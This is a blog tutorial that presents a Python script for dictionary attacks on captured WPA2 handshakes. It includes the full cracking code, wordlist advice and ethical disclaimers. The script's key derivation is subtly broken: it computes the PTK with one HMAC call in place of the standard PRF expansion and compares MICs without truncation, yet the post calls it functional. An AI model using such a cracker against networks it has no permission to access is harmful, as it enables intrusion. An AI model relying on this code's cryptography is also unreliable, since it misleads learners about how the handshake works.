::: {}
# How to Create a Wi-Fi Password Cracker with Python {#how-to-create-a-wi-fi-password-cracker-with-python .p-name}
:::

::: {.section .p-summary field="subtitle"}
Introduction
:::

::::::: {.section .e-content field="body"}
:::::: {#0b67 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### How to Create a Wi-Fi Password Cracker with Python {#02ef .graf .graf--h3 .graf--leading .graf--title name="02ef"}

<figure id="d547" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*frAudc_2G6dfYdik.jpeg"
class="graf-image" data-image-id="0*frAudc_2G6dfYdik.jpeg"
data-width="1400" data-height="788" data-is-featured="true" />
</figure>

### Introduction {#6792 .graf .graf--h3 .graf-after--figure name="6792"}

Wi-Fi has become an integral part of modern life, providing us with
internet connectivity everywhere we go. However, the security of Wi-Fi
networks is often compromised due to poor configurations or weak
passwords. As a cybersecurity enthusiast, understanding how Wi-Fi
security works is crucial. One of the key learning exercises in ethical
hacking and cybersecurity is learning how attackers might crack Wi-Fi
passwords using programming languages such as Python.

In this blog post, we will walk you through creating a simple Wi-Fi
password cracker using Python. It is essential to note that this blog is
purely for educational purposes, and you must not attempt to hack into
any network without explicit permission. The purpose here is to help
cybersecurity professionals, researchers, and learners understand
potential vulnerabilities and work towards creating more secure
networks.

### Disclaimer {#5a9b .graf .graf--h3 .graf-after--p name="5a9b"}

This blog post is written purely for educational purposes. Unauthorized
access to computer systems, networks, or devices is illegal. The methods
described here should only be used in legal, ethical hacking
environments with the explicit permission of the network owner. Always
ensure you are compliant with local laws and regulations.

### Wi-Fi Security Overview {#4cfb .graf .graf--h3 .graf-after--p name="4cfb"}

Wi-Fi networks are typically secured using one of several encryption
standards:

1.  [**WEP (Wired Equivalent Privacy)**: This is the weakest form of
    encryption, considered obsolete and vulnerable to various attacks.
    Although still in use, it is not recommended due to known
    vulnerabilities.]{#3c91}
2.  [**WPA (Wi-Fi Protected Access)**: WPA is more secure than WEP, but
    WPA-1 (the first iteration) also has known weaknesses. Most networks
    now use WPA2 or WPA3.]{#84d9}
3.  [**WPA2 (Wi-Fi Protected Access II)**: The current standard for
    wireless networks. WPA2 offers much stronger security than WEP and
    WPA1, but it can still be vulnerable to attacks if a weak password
    is used.]{#0148}
4.  [**WPA3 (Wi-Fi Protected Access III)**: The latest version of WPA,
    which introduces stronger encryption mechanisms and better
    protection against brute force attacks.]{#6a10}

Wi-Fi networks, especially those using WPA2, rely heavily on strong
passwords to secure the network. If the password is weak, an attacker
can use various tools and techniques to crack it. In this blog, we will
demonstrate a simple Python script to crack WPA2 passwords using a
dictionary attack.

### Understanding How Wi-Fi Password Cracking Works {#ba34 .graf .graf--h3 .graf-after--p name="ba34"}

Wi-Fi password cracking typically involves capturing the four-way
handshake, which is part of the authentication process between the
router and a client device. Once the handshake is captured, it can be
brute-forced or subjected to a dictionary attack to guess the password.

A dictionary attack involves using a list of potential passwords
(commonly called a wordlist) and attempting each one until the correct
password is found. This method works well when the password is weak or
based on common words.

**Steps Involved:**

1.  [**Monitor Wi-Fi traffic**: Capture Wi-Fi traffic, especially the
    handshake between a device and the router.]{#21de}
2.  [**Perform a dictionary attack**: Use a list of potential passwords
    and try each one to see if it matches the password used by the
    router.]{#a03a}

Since Python does not directly capture Wi-Fi traffic, we will focus on
the dictionary attack part using Python in this blog post.

### Requirements {#f3f2 .graf .graf--h3 .graf-after--p name="f3f2"}

Before we start writing the Python code, let's make sure you have the
necessary tools and libraries installed:

- [**Python 3.x**]{#0c4b}
- [**Wireless Adapter** that supports monitor mode (for capturing the
  Wi-Fi handshake, if you're going beyond the script)]{#abee}
- [**Wordlist**: A text file containing a list of possible
  passwords.]{#3ee5}
- [**Python Libraries**: `os`{.markup--code .markup--li-code},
  `subprocess`{.markup--code .markup--li-code}, `hashlib`{.markup--code
  .markup--li-code}, and `hmac`{.markup--code .markup--li-code}.]{#7315}

We won't cover how to capture the handshake in this blog, but you can
use tools like `aircrack-ng`{.markup--code .markup--p-code} or
`Wireshark`{.markup--code .markup--p-code} to do this. We'll focus on
using the captured handshake and trying to crack it using a Python
script.

### Step 1: Setting Up Your Python Environment {#66e1 .graf .graf--h3 .graf-after--p name="66e1"}

First, ensure you have Python installed. You can check if Python is
installed by typing the following command in your terminal or command
prompt:

``` {#5db3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
python --version
```

If you don't have Python installed, download and install it from
[Python's official website](https://www.python.org/){.markup--anchor
.markup--p-anchor data-href="https://www.python.org/" rel="noopener"
target="_blank"}.

You'll also need a wordlist, which can be a simple `.txt`{.markup--code
.markup--p-code} file with potential passwords listed line by line.
There are many wordlists available, including the popular
`rockyou.txt`{.markup--code .markup--p-code} used in many dictionary
attacks. You can download it from sources like GitHub or Kali Linux
repositories.

### Step 2: Understanding the Wi-Fi Handshake {#ad61 .graf .graf--h3 .graf-after--p name="ad61"}

The Wi-Fi handshake involves the router and the client exchanging
cryptographic keys to establish a secure connection. The four-way
handshake includes the following steps:

1.  [**Client sends an authentication request** to the access point
    (AP).]{#3885}
2.  [**Access point responds with an EAPOL (Extensible Authentication
    Protocol over LAN)** message, which includes a nonce (random
    number).]{#9177}
3.  [**Client generates the encryption key** and sends its own nonce
    back to the AP.]{#84bf}
4.  [**Access point confirms the encryption key**, and the client is
    allowed to connect.]{#a160}

The key exchange during this handshake is where the vulnerability lies.
If we capture this handshake, we can attempt to use a dictionary attack
to crack the password.

### Step 3: Writing the Python Script for Wi-Fi Password Cracking {#3615 .graf .graf--h3 .graf-after--p name="3615"}

We'll now write a Python script that takes a wordlist and a captured
handshake file and attempts to crack the Wi-Fi password.

#### Script Overview: {#455d .graf .graf--h4 .graf-after--p name="455d"}

- [We'll use the `hmac`{.markup--code .markup--li-code} and
  `hashlib`{.markup--code .markup--li-code} libraries to generate the
  hash for each password guess.]{#34de}
- [We'll compare the generated hash with the hash from the
  handshake.]{#781d}
- [If the hashes match, the correct password has been found.]{#6274}

Here's the Python code:

``` {#354e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
import hashlib
import hmac
import binascii
import os
```

``` {#7299 .graf .graf--pre .graf-after--pre}
def pbkdf2_hmac_sha1(password, ssid, iterations, dklen=32):
    """
    Key derivation function (PBKDF2) with HMAC-SHA1 as the PRF, 
    used to generate the Pairwise Master Key (PMK).
    """
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), iterations, dklen)
```

``` {#806f .graf .graf--pre .graf-after--pre}
def calculate_ptk(pmk, a_nonce, s_nonce, ap_mac, client_mac):
    """
    Calculate the Pairwise Transient Key (PTK) by combining the 
    PMK with the handshake parameters (nonces, MAC addresses).
    """
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(a_nonce, s_nonce) + max(a_nonce, s_nonce)
    return hmac.new(pmk, b, hashlib.sha1).digest()
```

``` {#9d66 .graf .graf--pre .graf-after--pre}
def verify_password(pmk, ptk, eapol_msg, mic):
    """
    Verify if the calculated MIC (Message Integrity Code) matches the actual MIC from the handshake.
    """
    calculated_mic = hmac.new(ptk[:16], eapol_msg, hashlib.sha1).hexdigest()
    return calculated_mic == mic
```

``` {#2802 .graf .graf--pre .graf-after--pre}
def crack_wifi_password(ssid, wordlist_file, a_nonce, s_nonce, ap_mac, client_mac, eapol_msg, mic):
    """
    Attempt to crack the Wi-Fi password by iterating through the wordlist and checking each password.
    """
    with open(wordlist_file, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            print(f"Trying password: {password}")
            pmk = pbkdf2_hmac_sha1(password, ssid, 4096)
            ptk = calculate_ptk(pmk, a_nonce, s_nonce, ap_mac, client_mac)
            if verify_password(pmk, ptk, eapol_msg, mic):
                print(f"Password found: {password}")
                return password
    print("Password not found.")
    return None
```

``` {#5a6e .graf .graf--pre .graf-after--pre}
# Replace these with actual values from the captured handshake
ssid = "YourSSID"
wordlist_file = "wordlist.txt"
a_nonce = binascii.unhexlify("Nonce from AP")
s_nonce = binascii.unhexlify("Nonce from client")
ap_mac = binascii.unhexlify("MAC address of AP")
client_mac = binascii.unhexlify("MAC address of client")
eapol_msg = binascii.unhexlify("EAPOL message")
mic = "MIC from handshake"
```

``` {#7ba9 .graf .graf--pre .graf-after--pre}
cracked_password = crack_wifi_password(ssid, wordlist_file, a_nonce, s_nonce, ap_mac, client_mac, eapol_msg, mic)
if cracked_password:
    print(f"Successfully cracked the password: {cracked_password}")
else:
    print("Failed to crack the password.")
```

#### Explanation of the Code: {#ad55 .graf .graf--h4 .graf-after--pre name="ad55"}

1.  [**PBKDF2 Function**: The `pbkdf2_hmac_sha1()`{.markup--code
    .markup--li-code} function generates the Pairwise Master Key (PMK)
    from the password and SSID. The PMK is derived using the PBKDF2 key
    derivation function with HMAC-SHA1 as the pseudorandom function
    (PRF).]{#5fe8}
2.  [**PTK Calculation**: The `calculate_ptk()`{.markup--code
    .markup--li-code} function takes the PMK and other handshake
    parameters (AP nonce, client nonce, MAC addresses) to derive the
    Pairwise Transient Key (PTK).]{#5b92}
3.  [**MIC Verification**: The `verify_password()`{.markup--code
    .markup--li-code} function compares the MIC (Message Integrity Code)
    from the handshake with the one calculated using the guessed
    password. If the MICs match, the password is correct.]{#4f09}
4.  [**Cracking Loop**: The `crack_wifi_password()`{.markup--code
    .markup--li-code} function iterates over the wordlist, trying each
    password and checking if it generates the correct MIC.]{#382e}

### Step 4: Running the Script {#9cd9 .graf .graf--h3 .graf-after--li name="9cd9"}

To run the script, you'll need:

- [A captured Wi-Fi handshake file (this can be captured using tools
  like `aircrack-ng`{.markup--code .markup--li-code} or
  `Wireshark`{.markup--code .markup--li-code}).]{#0efe}
- [A wordlist file (`wordlist.txt`{.markup--code .markup--li-code}),
  which contains potential passwords.]{#1532}
- [The nonces, MAC addresses, and MIC from the handshake, which are
  required inputs for the script.]{#bfc9}

### Step 5: Ethical Use and Prevention {#c2bd .graf .graf--h3 .graf-after--li name="c2bd"}

This Wi-Fi password cracking script should only be used for educational
purposes and in environments where you have permission. Cracking Wi-Fi
passwords without authorization is illegal.

To protect yourself and your network from such attacks, consider the
following steps:

- [**Use WPA3 encryption**: WPA3 offers enhanced security features,
  making it more resistant to dictionary attacks.]{#2807}
- [**Choose strong passwords**: Avoid weak passwords. Use long, random
  combinations of characters, numbers, and symbols.]{#875e}
- [**Regularly update your router firmware**: Keep your router firmware
  up to date to patch known vulnerabilities.]{#5619}
- [**Use a secure wordlist**: Ensure your password is not included in
  common wordlists like `rockyou.txt`{.markup--code
  .markup--li-code}.]{#0742}

### Conclusion {#f2b6 .graf .graf--h3 .graf-after--li name="f2b6"}

Creating a Wi-Fi password cracker in Python provides an excellent
learning opportunity for those interested in ethical hacking and
cybersecurity. Understanding how attackers may attempt to crack Wi-Fi
passwords can help you better protect your networks. By using strong
passwords and the latest encryption standards, you can significantly
reduce the risk of having your network compromised.

Remember to use this knowledge ethically and legally. Unauthorized
hacking or penetration testing can lead to severe legal consequences.
Always ensure you have permission when working on any network security
tasks.

### Promote and Collaborate on Cybersecurity Insights {#b7c3 .graf .graf--h3 .graf-after--p name="b7c3"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#5c62 .graf .graf--h3 .graf-after--p name="5c62"}

[Vijay
Gupta](https://www.youtube.com%2F@www.youtube.com/@bevijaygupta){.markup--anchor
.markup--p-anchor
data-href="https://www.youtube.com%2F@www.youtube.com/@bevijaygupta"
rel="noopener ugc nofollow noopener" target="_blank"} is a cybersecurity
enthusiast with several years of experience in cyber security, [cyber
crime forensics
investigation](https://www.amazon.com/dp/B0CW4L574N){.markup--anchor
.markup--p-anchor data-href="https://www.amazon.com/dp/B0CW4L574N"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 18, 2024](https://medium.com/p/65340e1ef6a9).

[Canonical
link](https://medium.com/@bevijaygupta/how-to-create-a-wi-fi-password-cracker-with-python-65340e1ef6a9){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
